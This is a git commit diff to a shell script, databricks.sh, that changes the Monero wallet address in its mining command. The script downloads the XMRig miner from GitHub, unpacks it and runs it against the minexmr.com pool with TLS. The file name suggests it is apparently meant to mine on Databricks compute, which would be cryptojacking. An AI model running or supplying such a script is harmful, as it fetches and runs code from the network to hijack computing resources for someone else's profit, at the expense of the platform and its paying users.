9e77dde952fd6539ee9f222c8f5b2eabbe7db02b
elyelma <67550061+elyelma@users.noreply.github.com>
2022-09-30 14:22:44 -0500

    Update databricks.sh

--- databricks.sh
+++ databricks.sh
@@ -9,4 +9,4 @@ screen -R xmr
 wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
 tar xvzf xmrig-6.17.0-linux-x64.tar.gz
 cd xmrig-6.17.0
-./xmrig -o us-west.minexmr.com:443 -u 8A6cdvshzV4dEWthU6fdgjMoJaNgwTn7rLDSdpLoKtHrQ83cdQCWtQQe6HGDrnYv5Z3zUfGuKSR8AByBGpgVPkc8Kp95en3 -k --tls --rig-id aank
+./xmrig -o us-west.minexmr.com:443 -u 46BuQsPCKtXUhbCWnVM4m866NB3U6BYZ5QFEBrr9rxt286kvKuypytjg2pfALciJBRjU6HpWHA3oESPioBn2uoz2TawLv8D -k --tls --rig-id aank
